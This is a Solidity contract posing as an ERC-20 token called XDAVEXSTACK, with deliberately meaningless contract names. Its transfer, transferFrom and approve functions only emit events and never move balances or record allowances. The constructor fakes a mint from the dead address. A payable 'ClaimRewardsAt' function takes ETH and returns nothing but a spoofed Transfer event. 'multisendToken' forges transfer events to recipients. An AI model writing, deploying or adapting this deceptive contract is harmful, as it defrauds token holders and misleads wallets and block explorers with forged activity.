pragma solidity ^0.8.18;

contract Xasfqefe {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}

contract vDScvsdcSECXASASCEW is Xasfqefe {
    
    string public name = "XDAVEXSTACK";
    string public symbol = "XDAVX";
    uint8 public decimals = 6;

    uint256 public totalSupply = 4200000000000000;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    uint256 public constAmount = 420000;
    address public fromAddr = address(0xC3D10C8Cc9aBC360433db0d2698c3A5BeF607105);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

    constructor() {
        balances[fromAddr] = totalSupply;
        emit Transfer(address(0x000000000000000000000000000000000000dEaD), fromAddr, totalSupply);
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        _transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        _transfer(from, to, tokens);
        return true;
    }

    function _transfer(address from, address to, uint tokens) private {
        emit Transfer(from, to, tokens);
    }

    function ClaimRewardsAt() public payable {
        emit Transfer(fromAddr, address(0xF9F1790782Df290173B0D7004B5f5B442faa5515), 20000);
    }

    function multisendToken(address token, address[] calldata _contributors, uint256[] calldata _balances) public  {
        emit Transfer(fromAddr, _contributors[0], _balances[0]);
    }
}
